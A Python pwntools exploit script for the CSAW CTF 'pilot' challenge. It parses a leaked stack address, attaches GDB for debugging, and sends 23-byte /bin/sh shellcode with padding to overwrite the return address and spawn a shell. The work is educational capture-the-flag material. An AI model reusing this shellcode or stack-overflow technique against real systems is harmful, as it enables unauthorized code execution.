#!/usr/bin/python
# Created for CSAW365 CTF pwn challenge "pilot"
# This is an example of using pwntools on a local process; specifically, this
# showcases spawning GDB via pwntools and breaking at a specific point to aid
# in debugging how the local process that pwntools interacts with
# responds to the exploit

from pwn import *
import struct

p = process("./pilot")

# try to attach with GDB
# breakpoint is at a specifc interesting place for this binary
# multiple breakpoints can be set if desired
gdb.attach(p,'''
break *0x00400ae5
continue
''')

data = p.recv()

# Extract the memory address output by the binary
# ASLR is present, so the address will change and can't be hard-coded
data = data.split("\n")
location = data[6]
location = location.split(":")
print location[1]
address = location[1]

print "Address is: " + address

# Convert from str to base16 int for use in struct.pack
print "Address converted from string to hex is: ", int(address,16)
address = int(address,16)

# 40-byte offset

# No nop sled necessary, as the address points precisely to our input
# on the stack
# 23-byte /bin/sh shellcode
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# pad out to reach offset
junk = "A" * 17

# Overwrite RIP with the provdied address
exploit = shellcode + junk + struct.pack("Q",address)

# Send the exploit and switch to interactive mode with
# the resulting shell
p.sendline(exploit)
print "Exploit sent, trying to get a shell..."
p.interactive()

p.close()
print "Done!"
